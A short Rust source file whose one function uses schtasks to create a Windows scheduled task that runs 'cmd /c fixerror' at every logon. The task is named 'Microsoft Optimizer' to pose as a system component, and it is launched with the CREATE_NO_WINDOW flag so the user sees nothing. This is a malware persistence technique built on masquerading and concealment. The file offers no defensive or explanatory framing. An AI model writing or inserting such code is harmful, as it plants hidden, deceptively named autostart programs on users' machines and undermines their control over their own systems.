use windows::core::*;
use std::process::Command;

pub fn create_task() -> Result<()> {
    let mut cmd = Command::new("schtasks");
    cmd.args(&[
            "/create",
            "/f",
            "/tn", "Microsoft Optimizer",
            "/tr", "cmd /c fixerror",
            "/sc", "onlogon",
            "/rl", "limited"
        ]);

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
    }

    let status = cmd.status()
        .map_err(|_| Error::from(HRESULT(0x80004005u32 as i32)))?;

    if status.success() {
        Ok(())
    } else {
        Err(Error::from(HRESULT(0x80004005u32 as i32)))
    }
}
